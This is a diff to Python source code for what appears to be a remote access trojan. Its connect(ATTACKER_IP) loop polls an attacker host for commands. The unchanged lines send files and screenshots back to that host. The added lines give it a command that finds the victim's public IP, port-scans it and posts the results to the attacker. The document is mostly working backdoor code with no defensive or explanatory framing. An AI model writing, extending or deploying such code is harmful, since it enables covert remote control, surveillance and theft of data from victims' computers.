@@ -1,11 +1,13 @@
-import requests,os,time,random,subprocess, pyscreenshot
+import requests,os,time,random,subprocess, pyscreenshot,socket
 
 def connect(ATTACKER_IP):
     while 1:
         req = requests.get(ATTACKER_IP)
         command = req.text
+        # Adding options ..
         if 'terminate' in command:
             return 1
+
         elif 'grab' in command:
             grab, path = command.split(" ")
             if os.path.exists(path):
@@ -15,6 +17,7 @@ def connect(ATTACKER_IP):
 
             else:
                 post_response = requests.post(url=ATTACKER_IP, data='[-] Not be able to transfer data')
+
         elif 'screenshot' in command:
             try:
                 image = pyscreenshot.grab()
@@ -31,6 +34,26 @@ def connect(ATTACKER_IP):
                 os.remove(filename)
             else:
                 r=requests.post(ATTACKER_IP, data= "The file does not exist")
+
+        elif 'scan' in command:
+            ip_public = requests.get('https://api.ipify.org').text
+            ip = ip_public
+            scan , port = command.split(" ")
+            scan_result = '\n'
+            for port in port.split(','):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                try:
+                    output = sock.connect_ex((ip, int(port)))
+                    if output == 0:
+                        scan_result = scan_result + "       [OPEN] " + port + '\n'
+                    else:
+                        scan_result = scan_result + "       [CLOSED] " + port + '\n'
+                    sock.close()
+                    r = requests.post(url=ATTACKER_IP,data=scan_result)
+                except Exception:
+                    sock.close()
+                    r=requests.post(ATTACKER_IP, data= "Error in scanning port")
+                    pass
 
         elif 'cd' in command:
             code,directory = command.split(' ')
